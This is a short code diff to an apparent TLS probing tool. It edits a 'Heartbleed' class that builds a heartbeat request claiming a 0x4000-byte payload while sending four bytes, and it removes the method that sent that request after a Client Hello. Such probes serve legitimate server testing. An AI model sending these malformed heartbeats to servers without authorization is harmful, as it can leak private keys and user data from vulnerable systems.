@@ -391,22 +391,16 @@ class Heartbeat12PFS(NormalHandshake12PFS, Heartbeat12):
 class Heartbleed(Heartbeat):
     '''Try to send a heartbleed attack'''
 
-    def make_heartbleed(self):
+    def make_heartbeat(self):
         heartbeat = HeartbeatMessage.create(HeartbeatMessage.HeartbeatRequest,
                                             'XXXX', 0x4000)
 
         record = TLSRecord.create(content_type=TLSRecord.Heartbeat,
-                                  version=TLSRecord.TLS1_0,
+                                  version=self.record_version,
                                   message=heartbeat.bytes)
-        
+
         #hexdump(record.bytes)
         return record.bytes
-
-    def test(self, sock):
-        logging.debug('Sending Client Hello...')
-        sock.write(self.make_hb_hello())
-        logging.debug('Sending Heartbleed...')
-        sock.write(self.make_heartbleed())
 
 
 class HighTLSVersion(Probe):
